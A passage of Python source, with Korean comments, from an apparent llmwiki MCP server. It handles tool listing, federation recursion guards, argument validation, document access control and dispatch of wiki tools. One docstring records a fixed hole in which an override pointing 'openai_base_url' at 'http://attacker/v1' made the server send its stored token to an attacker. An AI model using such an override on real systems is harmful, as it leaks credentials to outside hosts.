                spec["annotations"] = dict(t["annotations"])
            out.append(spec)
    return out


def _known_remote_tools(settings, src: str, cfg: Dict[str, Any]) -> List[str]:
    """expose:true 일 때 통과시킬 도구 이름 — REST 는 cfg.tools 선언, MCP 는 캐시된 tools/list (없으면 지금 받아 온다)."""
    if str(cfg.get("transport") or "stdio").lower() == "rest":
        return [str(t.get("name") or "") for t in (cfg.get("tools") or []) if isinstance(t, dict)]
    with _FED_LOCK:
        ent = _FED_CACHE.get(src)
    if not ent:
        federated_tools(settings)
        with _FED_LOCK:
            ent = _FED_CACHE.get(src) or {}
    return [str(t.get("name") or "") for t in (ent.get("tools") or [])]


def duplicate_tools() -> List[str]:
    """마지막 tools/list 에서 이름이 겹쳐 **버려진** 도구 이름 (wiki_sources · doctor 가 보여 준다)."""
    with _FED_LOCK:
        return list((_FED_CACHE.get("_list") or {}).get("duplicates") or [])


FED_HEADER = "X-LLMWiki-Federation-Depth"     # 페더레이션 호출임을 원격에 알린다 → 원격은 자기 페더레이션을 하지 않는다 (A↔B 상호 expose 시 무한 재귀 방지)
FED_ENV = "LLMWIKI_FEDERATION_DEPTH"


def federation_allowed() -> bool:
    """이 프로세스가 다른 llmwiki 의 페더레이션 하위(stdio 자식 또는 헤더 표시)로 실행 중이면 False."""
    try:
        return int(os.environ.get(FED_ENV) or 0) <= 0
    except Exception:
        return True


def _annotated(t: Dict[str, Any]) -> Dict[str, Any]:
    """built-in 도구에 MCP annotations 를 붙인다 (플러그인은 자기 spec 의 것을 그대로 쓴다)."""
    a = ANNOTATIONS.get(t["name"])
    if not a or t.get("annotations"):
        return t
    out = dict(t)
    out["title"] = a.get("title") or t["name"]
    out["annotations"] = {k: v for k, v in a.items() if k != "title"}
    out["annotations"]["title"] = out["title"]
    return out


def list_tools(pipe, federate: bool = True) -> List[Dict[str, Any]]:
    """tools/list = built-in + 플러그인 + (federate 이면) 페더레이션."""
    s = getattr(pipe, "s", None)
    load_plugins(s)
    tools = [_annotated(t) for t in TOOLS] + _plugin_specs()
    fed_error = ""
    if federate and federation_allowed():
        try:
            tools += [{k: v for k, v in t.items() if not k.startswith("_")} for t in federated_tools(s)]
        except Exception as e:      # 페더레이션이 죽어도 우리 도구는 계속 보여야 한다 (원인은 wiki_sources 로 확인)
            fed_error = str(e)[:200]
    # 이름 중복은 클라이언트가 어느 것을 부를지 알 수 없다 — 뒤에 온 것을 버리고 알린다 (wiki_sources.duplicate_tools · doctor "중복 도구 이름")
    seen: Dict[str, int] = {}
    out = []
    dups: List[str] = []
    for t in tools:
        n = str(t.get("name") or "")
        if not n or n in seen:
            dups.append(n)
            continue
        seen[n] = 1
        out.append(t)
    with _FED_LOCK:
        st = _FED_CACHE.setdefault("_list", {})
        st["duplicates"] = dups
        if fed_error:
            st["error"] = fed_error
        else:
            st.pop("error", None)
    return out


def validate_args(spec: Dict[str, Any], args: Dict[str, Any]) -> Optional[str]:
    """inputSchema 의 required / type / enum 만 확인한다 (전체 JSON Schema 검증이 아니라, LLM 이 자주 틀리는 것만).

    빈 질문으로 wiki_query 를 부르면 예전에는 조용히 빈 결과가 나왔다 — 붙는 LLM 이 왜 실패했는지 알 수 없었다.
    """
    sch = spec.get("inputSchema") or {}
    props = sch.get("properties") or {}
    types = {"string": str, "integer": int, "number": (int, float), "boolean": bool, "array": list, "object": dict}
    for req in sch.get("required") or []:
        v = args.get(req)
        if v is None or (isinstance(v, str) and not v.strip()):
            return "필수 인자 '%s' 가 없습니다. inputSchema: %s" % (req, json.dumps(sch, ensure_ascii=False)[:400])
    for key, val in (args or {}).items():
        p = props.get(key)
        if not isinstance(p, dict) or val is None:
            continue
        want = types.get(str(p.get("type") or ""))
        if want and not isinstance(val, want):
            if want is not bool and isinstance(val, bool):
                return "인자 '%s' 는 %s 여야 합니다 (받은 값: %r)" % (key, p.get("type"), val)
            if want in (int, (int, float)) and isinstance(val, str) and val.strip().lstrip("-").replace(".", "", 1).isdigit():
                continue          # "8" 처럼 문자열로 보내는 클라이언트는 받아 준다 (아래에서 숫자로 캐스팅)
            if not isinstance(val, want):
                return "인자 '%s' 는 %s 여야 합니다 (받은 값: %r)" % (key, p.get("type"), val)
        if p.get("enum") and val not in p["enum"]:
            return "인자 '%s' 는 %s 중 하나여야 합니다 (받은 값: %r)" % (key, p["enum"], val)
    return None


def _text(s: str) -> Dict[str, Any]:
    return {"content": [{"type": "text", "text": s}]}


def _proxy_result(res: Any) -> Dict[str, Any]:
    """소스 tool 호출 결과(구조화 dict 또는 {"text":…}) → MCP result."""
    if isinstance(res, dict) and set(res.keys()) == {"text"}:
        return _text(str(res["text"]))
    out = _text(json.dumps(res, ensure_ascii=False, indent=1, default=str))
    if isinstance(res, dict):
        out["structuredContent"] = res
    return out


def call_extension(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> Optional[Dict[str, Any]]:
    """플러그인/페더레이션 도구면 처리해서 result 를, 아니면 None."""
    s = getattr(pipe, "s", None)
    load_plugins(s)
    ent = _plugin_tool(name)
    if ent is not None:
        spec, handler = ent
        bad = validate_args(spec, dict(args or {}))
        if bad:
            return _err("invalid arguments for %s: %s" % (name, bad))
        r = handler(pipe, dict(args or {}))
        return _text(str(r)) if not isinstance(r, dict) else (r if "content" in r else _proxy_result(r))
    if FED_SEP in name:
        if not federate or not federation_allowed():
            return {"content": [{"type": "text", "text": "federated tool %s is not available through a federated call (recursion guard)" % name}], "isError": True}
        src, tool = name.split(FED_SEP, 1)
        cfg = _exposed_sources(s).get(src)
        if not cfg:
            return {"content": [{"type": "text", "text": "unknown federated source %s (expose/mcp_federation 확인)" % src}], "isError": True}
        allow = cfg.get("expose")
        if isinstance(allow, list):
            if tool not in allow:
                return {"content": [{"type": "text", "text": "tool %s is not exposed by source %s" % (tool, src)}], "isError": True}
        elif tool not in _known_remote_tools(s, src, cfg):
            # expose:true 도 "그 서버가 tools/list 로 알린 도구" 만 통과한다 — 임의 이름(REST 라면 임의 경로)을 중계하지 않는다
            return {"content": [{"type": "text", "text": "tool %s is not in the tool list of source %s (expose:true 는 tools/list·tools 선언에 있는 도구만 중계)" % (tool, src)}], "isError": True}
        from . import mcp_client as _mc
        try:
            return _proxy_result(_mc.call_source_tool(src, cfg, tool, dict(args or {})))
        except Exception as e:
            return {"content": [{"type": "text", "text": "federated call failed (%s): %s" % (name, str(e)[:300])}], "isError": True}
    return None


def safe_overrides(pipe, overrides: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """도구 인자로 온 overrides 를 **호출자의 역할로** 거른다 (llmwiki/auth.py 의 화이트리스트).

    2026-09-19 이전에는 MCP 만 이 검사를 건너뛰었다. `/mcp` 는 read 등급이라 `anonymous_role` 이 켜져 있으면
    무인증으로 `{"overrides": {"openai_base_url": "http://attacker/v1"}}` 를 보낼 수 있었고, 서버가 .env 의
    PAT 를 그 주소로 보냈다 — Web 에서는 2026-09-18 에 막은 바로 그 구멍이 다른 문으로 남아 있었다.
    stdio(로컬 운영자)는 actor 가 admin 이라 예전처럼 전부 허용된다."""
    from . import auth as _auth      # noqa: F401 (AuthError 는 모듈 상단에서 이미 가져온다)
    if not overrides:
        return {}
    role = (pipe.actor or {}).get("role") or "viewer"
    cfg: Dict[str, Any] = {}
    try:
        cfg = _auth.load_security() or {}
    except Exception:
        cfg = {}
    return _auth.filter_overrides(dict(overrides), role, cfg)


def _query_with(pipe, question: str, k: Optional[int], mode: str, doc_types: Optional[List[str]], preset: Optional[str],
                overrides: Optional[Dict[str, Any]] = None, output_mode: Optional[str] = None):
    """요청 범위(설정 사본·튜닝 오버레이) 안에서 질의 — 다른 클라이언트의 동시 호출과 격리된다.
    overrides 는 Web /api/query 의 overrides 와 **같은 길**이다: 같은 화이트리스트로 거르고(auth.filter_overrides)
    request_scope → apply_overrides, overrides.tuning → 튜닝 오버레이."""
    names = [preset] if preset else []
    ov: Dict[str, Any] = dict(safe_overrides(pipe, overrides))
    if k:
        ov["top_k_final"] = int(k)
    if output_mode:
        ov["output_mode"] = str(output_mode)
    with pipe.request_scope(overrides=ov or None, presets=names, mode=mode or ""):
        if doc_types:
            from . import tuning as _tn
            _tn.T.values["doc_type_boost"] = ",".join("%s:1.3" % d for d in doc_types)   # 오버레이에만 기록
        res, tr = pipe.query(question, log=True)
    return res, tr


def _err(msg: str) -> Dict[str, Any]:
    return {"content": [{"type": "text", "text": msg}], "isError": True}


def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> Dict[str, Any]:
    args = dict(args or {})
    spec = next((t for t in TOOLS if t["name"] == name), None)
    if spec is not None:
        bad = validate_args(spec, args)
        if bad:
            return _err("invalid arguments for %s: %s" % (name, bad))
    ext = call_extension(pipe, name, args, federate=federate)
    if ext is not None:
        return ext
    if name == "wiki_analysis":
        from . import analysis as _an
        focus = str(args.get("focus") or "all")
        r = _an.analyze(pipe, int(args.get("request_id") or 0) or None, focus=None if focus == "all" else focus)
        if r.get("error"):
            return {"content": [{"type": "text", "text": r["error"]}], "isError": True}
        out = _text(r["markdown"])
        out["structuredContent"] = dict(r["summary"], **r["paths"])
        return out
    if name == "wiki_sources":
        from . import mcp_client as _mc
        rows = [_mc.source_summary(n, c) for n, c in _mc.load_sources().items()]
        fed = federated_tools(pipe.s, refresh=bool(args.get("check")))
        if args.get("check"):
            st = {r["name"]: r for r in _mc.test_sources(pipe.s, [r["name"] for r in rows if r["enabled"]])}
            for r in rows:
                r["status"] = st.get(r["name"])
        with _FED_LOCK:
            fed_errors = {k: v.get("error") for k, v in _FED_CACHE.items() if isinstance(v, dict) and v.get("error")}
        info = {"sources": rows, "external_rag": bool(pipe.s.toggles.external_rag), "mcp_federation": bool(getattr(pipe.s.toggles, "mcp_federation", False)),
                "mcp_sources": bool(pipe.s.toggles.mcp_sources), "plugins": load_plugins(pipe.s),
                "federated_tools": [t["name"] for t in fed],
                "federation_errors": fed_errors,
                "duplicate_tools": duplicate_tools(),          # 이름이 겹쳐 tools/list 에서 버려진 도구
                "mcp_config": {k: v for k, v in mcp_config().items() if k != "instructions"}}
        out = _text(json.dumps(info, ensure_ascii=False, indent=1, default=str))
        out["structuredContent"] = info
        return out
    if name == "wiki_external_search":
        from . import mcp_client as _mc
        q = str(args.get("query", ""))
        src = args.get("source")
        rows = _mc.retrieve(pipe.s, q, _cap_int(args, "k", 5, "max_k"), names=[src] if src else None, include_fallback=True)
        lines = ["외부 검색: %s%s" % (q, (" @ " + src) if src else "")]
        for r in rows:
            if r.get("error"):
                lines.append("- [%s] 오류: %s" % (r["source"], r["error"]))
            else:
                lines.append("- [%s] %s %s (score %.3f%s)\n  %s" % (r["source"], r["id"], r["title"], r["score"], (", " + str(r["url"])) if r.get("url") else "", (r["text"] or "")[:300].replace("\n", " ")))
        out = _text("\n".join(lines))
        out["structuredContent"] = {"results": rows}
        return out
    if name == "wiki_query":
        k_arg = _cap_int(args, "k", 0, "max_k") if args.get("k") not in (None, "") else None
        ov = args.get("overrides") if isinstance(args.get("overrides"), dict) else None
        try:
            res, _ = _query_with(pipe, str(args.get("question", "")), k_arg, str(args.get("mode") or "normal"), args.get("doc_types"), args.get("preset"),
                                 overrides=ov, output_mode=args.get("output_mode"))
        except ValueError as e:      # overrides.tuning 의 모르는 키·범위 밖 값
            return _err("invalid overrides: %s" % e)
        omode = str(res.get("output_mode") or "answer")
        if omode != "answer":
            # 중간 산출물 모드: text 는 후보 표(마크다운) 또는 컨텍스트 본문, structuredContent 에 candidates/lists/stages 또는 context/refs
            lines = [res["answer"], "", "output_mode: %s · result_type: %s · request_id: %s" % (omode, res.get("result_type"), res.get("request_id"))]
            if omode == "context":
                ev = res.get("evidence") or {}
                lines.append("판정: %s · refs %d건" % (ev.get("verdict", "-"), len(res.get("refs") or [])))
                sc = {k: res.get(k) for k in ("query", "output_mode", "result_type", "context", "refs", "evidence", "stages", "request_id", "run_id", "ms")}
            else:
                sc = {k: res.get(k) for k in ("query", "output_mode", "result_type", "candidates", "lists", "stages", "request_id", "run_id", "ms")}
            out = _text("\n".join(lines))
            out["structuredContent"] = sc
            return out
        lines = [res["answer"], ""]
        ev = res.get("evidence") or {}
        lines.append("판정: %s · groundedness: %s · 모드: %s · fallback: %d회" % (ev.get("verdict", "-"), res.get("groundedness"), res.get("answer_mode"), len(res.get("fallback") or [])))
        if res.get("llm_report"):
            lines.append("LLM 실행 보고: " + " | ".join(res["llm_report"].get("summary") or []))
        lines.append("근거:")
        for h in res["hits"]:
            if h.get("in_context"):
                ext = h.get("external") or {}
                lines.append("[C%s] %s (%s %s %s)%s%s | %s: %s" % (h["n"], h["doc_id"], h.get("doc_type") or "-", h.get("ext_id") or "", h.get("date") or "",
                                                                  " [doc_expand]" if "doc_expand" in (h.get("why") or []) else "",
                                                                  (" [외부 %s%s]" % (ext.get("source"), (" " + str(ext.get("url"))) if ext.get("url") else "")) if ext else "",
                                                                  h["heading"][:60], h["text"][:200].replace("\n", " ")))
        lines.append("request_id: %s · query_id: %s  (wiki_forensic / wiki_feedback 에 사용)" % (res.get("request_id"), res.get("query_id")))
        out = _text("\n".join(lines))
        # 2026-09-19: 기본(answer) 모드에도 구조화 결과를 준다. 예전에는 output_mode 가 answer 가 **아닐 때만** 줘서,
        # 정작 가장 많이 쓰는 경로에서 붙은 LLM 이 한국어 산문을 파싱해 인용을 되짚어야 했다 (다른 도구는 전부 주는데).
        # 필드 이름은 Web `/api/query` 의 result 와 같게 맞춘다 — 창구마다 다른 이름을 외우게 하지 않는다.
        out["structuredContent"] = {
            "query": res.get("query"), "answer": res.get("answer"),
            "output_mode": omode, "result_type": res.get("result_type"), "answer_mode": res.get("answer_mode"),
            "groundedness": res.get("groundedness"), "evidence": res.get("evidence") or {},
            "citations": [{"n": h.get("n"), "chunk_id": h.get("chunk_id"), "doc_id": h.get("doc_id"),
                           "heading": h.get("heading"), "doc_type": h.get("doc_type"), "ext_id": h.get("ext_id"),
                           "date": h.get("date"), "why": h.get("why")}
                          for h in res.get("hits") or [] if h.get("in_context")],
            "n_hits": len(res.get("hits") or []), "fallback": len(res.get("fallback") or []),
            # LLM 실패 보고 — 붙은 LLM 이 "답이 왜 이 모양인지"(재시도 몇 번, timeout 몇 초, 무엇으로 대체했는지)를
            # 산문에서 긁지 않고 읽을 수 있어야 한다. Web `/api/query` 의 result.llm_report 와 같은 모양이다.
            "llm_report": res.get("llm_report"),
            "request_id": res.get("request_id"), "query_id": res.get("query_id"),
            "run_id": res.get("run_id"), "ms": res.get("ms"),
        }
        return out
    if name == "wiki_related":
        text = str(args.get("text", ""))
        types = args.get("doc_types") or ["issue", "cl"]
        k = _cap_int(args, "k", 8, "max_k")
        from .profiler import Profiler
        from .retrieval import fts_search, vector_search
        from .textutil import keywords
        prof = Profiler("search", log=False)
        q = " ".join(keywords(text)[:20]) or text[:200]
        rows = [(c, s_) for c, s_, _ in fts_search(pipe.store, q, k * 2, pipe.store.synonyms(), prof)]
        rows += vector_search(pipe.store, pipe.embedder, text[:2000], k * 2, prof)
        meta = pipe.store.doc_meta_map()
        _af = pipe.acl_filter()          # 유사 문서 목록도 제목·ID 를 드러내므로 같은 판정을 건다 (docacl)
        seen: Dict[str, float] = {}
        for cid, s_ in rows:
            doc = cid.rsplit("#", 1)[0]
            dm = meta.get(doc) or {}
            if types and dm.get("doc_type") not in types:
                continue
            if _af.enabled and not _af.doc_ok(doc):
                continue
            seen[doc] = seen.get(doc, 0.0) + 1.0
        docs = sorted(seen.items(), key=lambda kv: -kv[1])[:k]
        lines = ["유사 문서 (%s):" % ", ".join(types)]
        from .graph_rules import entity_id_for
        for doc, sc in docs:
            dm = meta.get(doc) or {}
            title = next((d["title"] for d in pipe.store.list_docs() if d["doc_id"] == doc), doc)
            lines.append("- %s [%s %s %s] %s" % (doc, dm.get("doc_type"), dm.get("ext_id") or "", dm.get("date") or "", title[:60]))
            if dm.get("ext_id"):
                for r in pipe.store.relations_of(entity_id_for(dm["ext_id"]))[:8]:
                    if r["rel"] in ("co_occurs", "mentions", "mentions_date", "mentions_amount"):
                        continue
                    other = r["dst"] if r["src"] == entity_id_for(dm["ext_id"]) else r["src"]
                    oe = pipe.store.get_entity(other) or {}
                    lines.append("    ↳ %s %s (%s, %s)" % (r["rel"], oe.get("name", other), r.get("provenance"), ", ".join(pipe.store.docs_by_ext_id(oe.get("name", ""))[:2])))
        pipe.store.log_request("search", "related: %s" % q[:80], prof.finish(), None, {"doc_types": types}, keep=pipe.s.keep_requests)
        return _text("\n".join(lines))
    if name == "wiki_doc":
        ident = str(args.get("id", ""))
        mx = _cap_int(args, "max_chars", int(_cfg_num("max_doc_chars", 20000)), "max_doc_chars")
        docs = pipe.store.docs_by_ext_id(ident.upper()) or [d["doc_id"] for d in pipe.store.list_docs() if ident in d["doc_id"]]
        if not docs:
            return _text("not found: %s" % ident)
        # 문서 열람도 검색과 같은 출구다 — 여기서 막지 않으면 wiki_search 를 막아도 id 로 바로 읽힌다.
        _af = pipe.acl_filter()
        if _af.enabled:
            docs = [d for d in docs if _af.doc_ok(d)]
            if not docs:
                return {"content": [{"type": "text", "text": "%s: %s (역할 %s)" % (
                    _af.acl.get("deny_message") or "권한이 없는 문서입니다", ident, _af.role)}], "isError": True}
        doc_id = docs[0]
        chunks = pipe.store.all_chunks(doc_id)
        dm = pipe.store.get_doc_meta(doc_id) or {}
        text = "\n\n".join(c["text"] for c in chunks)
        lines = ["# %s" % doc_id, "meta: %s" % json.dumps({k: dm.get(k) for k in ("doc_type", "ext_id", "date", "status", "tags", "modules", "related", "hw_rev")}, ensure_ascii=False),
                 "chunks: %d" % len(chunks), "", text[:mx]]
        if dm.get("ext_id"):
            from .graph_rules import entity_id_for
            rels = [r for r in pipe.store.relations_of(entity_id_for(dm["ext_id"])) if r["rel"] not in ("co_occurs", "mentions", "mentions_date", "mentions_amount")][:15]
            if rels:
                lines += ["", "관계:"] + ["- %s -[%s]-> %s (%s)" % ((pipe.store.get_entity(r["src"]) or {}).get("name", r["src"]), r["rel"],
                                                                     (pipe.store.get_entity(r["dst"]) or {}).get("name", r["dst"]), r.get("provenance")) for r in rels]
        return _text("\n".join(lines))
    if name == "wiki_propose":
        from . import evolve as _ev
        kind = str(args.get("kind", ""))
        # 종류 목록은 evolve.KINDS 한 곳에서 온다 (Web 드롭다운·apply 와 같은 목록)
        if kind not in _ev.KINDS:
            return {"content": [{"type": "text", "text": "unsupported kind %s — 가능: %s" % (kind, ", ".join(sorted(_ev.KINDS)))}], "isError": True}
        pid = pipe.store.add_proposal(kind, dict(args.get("payload") or {}), str(args.get("reason") or "mcp"), float(args.get("confidence") or 0.7), "mcp")
        return _text(json.dumps({"proposal_id": pid, "status": "proposed", "note": "사람 승인 필요: evolve apply %d" % pid}, ensure_ascii=False))
    if name == "wiki_feedback":
        from . import evolve as _ev
        try:
            r = _ev.record_feedback(pipe, int(args.get("query_id") or 0), int(args.get("feedback") or 0), str(args.get("note") or ""))
        except Exception as e:
            return {"content": [{"type": "text", "text": "feedback error: %s" % e}], "isError": True}
        return _text(json.dumps(r, ensure_ascii=False, default=str))
    if name == "wiki_forensic":
        from . import forensic as _fx
        rid = int(args.get("request_id") or 0)
        if not rid:
            reqs = pipe.store.requests("query", 1)
            rid = int(reqs[0]["id"]) if reqs else 0
        if not rid:
            return {"content": [{"type": "text", "text": "no query request to analyze"}], "isError": True}
        rep = _fx.trace_expectation(pipe, rid, list(args.get("expected_docs") or []), list(args.get("expected_terms") or []), list(args.get("expected_chunks") or []),
                                    note=str(args.get("note") or "mcp"), propose=bool(args.get("propose")))
        out = _text(_fx.format_expectation(rep))
        out["structuredContent"] = {k: v for k, v in rep.items() if k in ("request_id", "query", "summary", "lost_counts", "suggestions", "best_target", "proposals", "forensic_id")}
        return out
    if name == "wiki_evolve":
        from . import evolve as _ev
        st = str(args.get("status") or "proposed")
        lim = _cap_int(args, "limit", 30, "max_k")
        if args.get("id") is not None:
            # 한 건 상세 — 설명 전문 (CLI `evolve show <id>` · Web /api/evolve/describe 와 같은 내용)
            from . import proposal_explain as _pe
            d = _ev.describe_proposal(pipe, int(args["id"]))
            if d.get("error"):
                return {"content": [{"type": "text", "text": "제안 #%s 없음" % args["id"]}], "isError": True}
            one = _text(_pe.format_description(d))
            one["structuredContent"] = d
            return one
        rows = pipe.store.proposals(st, lim)
        explain = args.get("explain", True) is not False
        exps = _ev.describe_proposals(pipe, rows) if explain else [None] * len(rows)
        out = {"status": st, "n": len(rows),
               "proposals": [dict({"id": r["id"], "kind": r["kind"], "confidence": r.get("confidence"),
                                   "payload": r.get("payload"), "reason": r.get("reason"), "origin": r.get("origin"),
                                   "ts": r.get("ts"), "status": r.get("status")},
                                  **({"explain": {k: e[k] for k in ("title", "what", "target", "diff", "impact",
                                                                    "checks", "applicable")}} if e else {}))
                             for r, e in zip(rows, exps)],
               "recent_log": pipe.store.evolution_log(15),
               "auto_apply": bool(pipe.s.toggles.evolve_auto_apply),
               "auto_apply_kinds": _ev.auto_apply_kinds(pipe.s),
               "min_confidence": pipe.s.evolve_min_confidence,
               "kinds": _ev.KINDS,
               "note": "적용·거절은 사람이 합니다 — Web Evolve 탭 또는 `evolve apply <id>` / `evolve reject <id> 사유`"}
        res = _text(json.dumps(out, ensure_ascii=False, indent=1, default=str))
        res["structuredContent"] = {k: out[k] for k in ("status", "n", "auto_apply", "auto_apply_kinds", "min_confidence")}
        return res
    if name == "wiki_inspect":
        from . import querydebug as _qd
        d = _qd.inspect_query(pipe, str(args.get("query", "")))
        res = _text(_qd.render_text(d))
        res["structuredContent"] = d
        return res
    if name == "wiki_search":
        # CLI `search` · Web /api/search 와 **같은 엔진**(retrieval.channel_search) 을 쓴다.
        from .profiler import Profiler
        from .retrieval import channel_search, parse_channels
        q, k = str(args.get("query", "")), _cap_int(args, "k", 8, "max_k")
        chans = parse_channels(args.get("channels") if args.get("channels") is not None else args.get("channel", "fts"))
        prof = Profiler("search")
        out = channel_search(pipe.store, pipe.embedder, pipe.s, q, chans, mode=str(args.get("mode") or "or"), k=k, prof=prof,
                             require=args.get("require"), exclude=args.get("exclude"),
                             acl=pipe.acl_filter(),      # 문서 접근 제어 — Web /api/search 와 같은 판정 (docacl)
                             doc_types=args.get("doc_types"))
        res = _text(json.dumps(out, ensure_ascii=False, indent=1))
        # 붙는 LLM 이 표를 다시 파싱하지 않도록 구조화 결과도 같이 준다
        res["structuredContent"] = {"channels": out["channels"], "mode": out["mode"], "counts": out["counts"],
                                    "rows": [{"chunk_id": r["chunk_id"], "score": r["score"], "n_channels": r["n_channels"],
                                              "channels": sorted(r["channels"]), "doc_id": r.get("doc_id"),
                                              "heading": r.get("heading")} for r in out["rows"]]}
        return res
    if name == "wiki_entity":
        from .graph_rules import entity_id_for
        nm = str(args.get("name", ""))
        d = pipe.entity_detail(nm if nm.startswith("e:") else entity_id_for(nm))
        if not d:
            hits = pipe.store.entity_fts('"%s"' % nm.replace('"', ""), 5)
            return _text("not found. candidates: %s" % [pipe.store.get_entity(e)["name"] for e, _ in hits])
        e = d["entity"]
        lines = ["%s (%s) degree=%s docs=%s" % (e["name"], e["type"], e["degree"], e.get("n_docs")), e.get("description") or "", "문서 참조:"]
        lines += ["- %s (언급 %s, 첫 청크 %s)" % (r["doc_id"], r["mentions"], r.get("first_chunk")) for r in e.get("doc_refs", [])[:15]]
        lines += ["관계:"] + ["- %s -[%s]-> %s (%s conf=%.2f %s)" % (r["src_name"], r["rel"], r["dst_name"], r.get("provenance") or "?", float(r.get("confidence") or 0), r.get("chunk_id") or "")
                            for r in d["relations"][:25]]
        return _text("\n".join(lines))
    if name == "wiki_graph_rules":
        # 그래프 빌드 규칙 (data/rules.json) — CLI `graph-rules` · Web /api/graph_rules 와 같은 내용
        from . import graph_rules as _gr
        act = str(args.get("action") or "types")
        gr_rules = _gr.load_rules()
        if act == "lint":
            r = _gr.lint(gr_rules)
            out = _text(json.dumps(r, ensure_ascii=False, indent=1))
            out["structuredContent"] = {"counts": r["counts"], "n_issues": len(r["issues"])}
            return out
        if act == "test":
            q = str(args.get("q") or "").strip()
            if not q:
                return _err("action=test 에는 q(문장) 가 필요합니다")
            ex = _gr.RuleExtractor(gr_rules)
            dm = {"doc_type": str(args.get("doc_type") or ""), "ext_id": str(args.get("ext_id") or "")}
            ents, cnts, rels = ex.extract_chunk(q, "", "test", "테스트 문서", dm if (dm["doc_type"] or dm["ext_id"]) else None)
            r = {"entities": [{"name": e.name, "type": e.type, "mentions": cnts.get(k, 0)} for k, e in ents.items()],
                 "relations": [{"src": ents[x.src].name if x.src in ents else x.src, "rel": x.rel,
                                "dst": ents[x.dst].name if x.dst in ents else x.dst,
                                "provenance": x.provenance, "weight": x.weight} for x in rels],
                 "unknown_rels": ex.schema.unknown_rels, "unknown_types": ex.schema.unknown_types}
            out = _text(json.dumps(r, ensure_ascii=False, indent=1))
            out["structuredContent"] = {"n_entities": len(r["entities"]), "n_relations": len(r["relations"])}
            return out
        types = _gr.known_types(gr_rules)
        schema = _gr.Schema(gr_rules.get("schema"), types)
        r = {"entity_types": types, "value_types": _gr.describe_value_types(),
             "relations": schema.relations, "on_unknown": schema.on_unknown,
             "n_entities": len(gr_rules.get("entities") or {}),
             "note": "값 종류는 relation_patterns[*].value 와 chunk_values[*].value 에 쓴다. "
                     "관계 어휘 밖의 이름은 on_unknown 정책대로 처리되고 빌드 보고서에 남는다. "
                     "규칙 추가는 wiki_propose 의 entity/alias 제안으로 (사람이 승인)."}
        out = _text(json.dumps(r, ensure_ascii=False, indent=1))
        out["structuredContent"] = {"n_types": len(types), "n_value_types": len(r["value_types"]),
                                    "n_relations": len(schema.relations), "on_unknown": schema.on_unknown}
        return out
    if name == "wiki_rules":
        from . import query_rules as _qr
        from . import tuning as _tn
        act = str(args.get("action") or "explain")
        if act == "types":
            # 규칙 유형 표 — 붙은 LLM 이 "이 말을 어느 유형에 넣자" 를 제안할 때 근거가 된다 (제안은 wiki_propose).
            rows = _qr.describe_types()
            out = _text(json.dumps({"types": rows, "n": len(rows),
                                    "note": "유형마다 적용 방식이 다릅니다. 완전 동치=acronym · 비슷=synonym · 표기=alias · 곁가지=related · "
                                            "잡음=exclude · 붙여쓰기=compound · 문맥마다 뜻이 갈림=context · 분류체계=hypernym · 숫자+단위=unit"},
                                   ensure_ascii=False, indent=1))
            out["structuredContent"] = {"types": rows, "n": len(rows)}
            return out
        if act == "test":
            q = str(args.get("q") or "").strip()
            if not q:
                return _err("action=test 에는 q(질의) 가 필요합니다")
            r = _qr.expand(q, _tn.T.get("syn_w"), _tn.T.get("related_w"), _tn.T.get("acronym_phrase"))
            out = _text(json.dumps(r, ensure_ascii=False, indent=1))
            out["structuredContent"] = r
            return out
        term = str(args.get("term") or "").strip()
        if not term:
            return _err("action=explain 에는 term(용어) 이 필요합니다")
        r = _qr.explain(term)
        from .cli import _rules_explain_text
        out = _text(_rules_explain_text(r))
        out["structuredContent"] = r
        return out
    if name == "wiki_graph_profile":
        from . import graph_profile as _gp
        prof = _gp.profile(pipe, include_eval=bool(args.get("eval")))
        prof["saved"] = _gp.save(prof)
        if args.get("compare"):
            hist = _gp.history(pipe.s)
            prev = _gp.load(hist[1]["path"]) if len(hist) > 1 else None
            prof["compare"] = _gp.compare(prev, prof) if prev else None
        out = _text(_gp.render_text(prof))
        out["structuredContent"] = prof
        return out
    if name == "wiki_status":
        out = {"stats": pipe.store.stats(), "providers": {k: v for k, v in pipe.provider_status().items() if k not in ("catalog", "agents")},
               "doc_types": pipe.store.doc_type_counts(), "provenance": pipe.store.provenance_counts()}
        if args.get("full"):
            # 운영 통계 — CLI `stats --full` · Web 옵저빌리티 › 시스템 과 같은 함수 (읽기 전용)
            from . import opstats as _ops
            secs = args.get("sections") or None
            # 호출자 역할로 가린다 — `users` 절은 admin 만(Web `/api/opstats` · `/api/query_users` 와 같은 기준).
            # 붙은 LLM 이 API 키 역할을 넘어 "누가 얼마나 썼나" 를 보면 안 된다 (2026-09-20 정렬 감사).
            out["ops"] = _ops.redact(
                _ops.collect(pipe, days=float(args.get("days") or 7),
                             sections=list(secs) if secs else None, top=_cap_int(args, "top", 8, "max_k"),
                             bucket=str(args.get("bucket") or "day")),
                admin=((pipe.actor or {}).get("role") == "admin"))
        return _text(json.dumps(out, ensure_ascii=False, indent=1, default=str))
    if name == "wiki_requests":
        # source=ledger: 요청 **원장**(거절·시간초과·취소·중단 포함, docs/REQUEST_LEDGER.md).
        # profile(기본)은 requests 테이블 — 성공한 요청의 '그때 그 답'. 도구를 늘리지 않고 같은 도구에 원천을 더한다:
        # 붙은 LLM 이 던지는 질문("전에 물어본 적 있나" / "왜 실패했나")이 한 도구 안에서 답이 되게.
        if str(args.get("source") or "profile").lower() == "ledger":
            from . import reqledger as _led
            tok = str(args.get("token") or "")
            if tok:
                rec = _led.one(tok)
                if not rec:
                    return _err("원장에 없는 요청입니다: %s" % tok)
                out = _text(json.dumps(rec, ensure_ascii=False, indent=1, default=str))
                out["structuredContent"] = {k: rec.get(k) for k in ("token", "status", "kind", "http", "ms", "code")}
                return out
            st = [s for s in str(args.get("status") or "").split(",") if s]
            rows, total = _led.read(status=st or None, kind=str(args.get("kind") or ""),
                                    q=str(args.get("q") or ""), user=str(args.get("user") or ""),
                                    limit=max(1, min(int(args.get("limit") or 20), 200)))
            brief = [{k: r.get(k) for k in ("token", "opened", "status", "kind", "origin", "user",
                                            "label", "http", "code", "ms", "queue_wait_s", "request_id")} for r in rows]
            out = _text(json.dumps(brief, ensure_ascii=False, indent=1, default=str))
            # 원장 자체의 건강 상태도 함께 준다 (CLI `ledger stats`·Web 상태 줄과 같은 값).
            # 버려지거나 깨진 줄이 있으면 목록이 완전하지 않다는 뜻이므로, 붙은 LLM 이 그것을 알아야 한다.
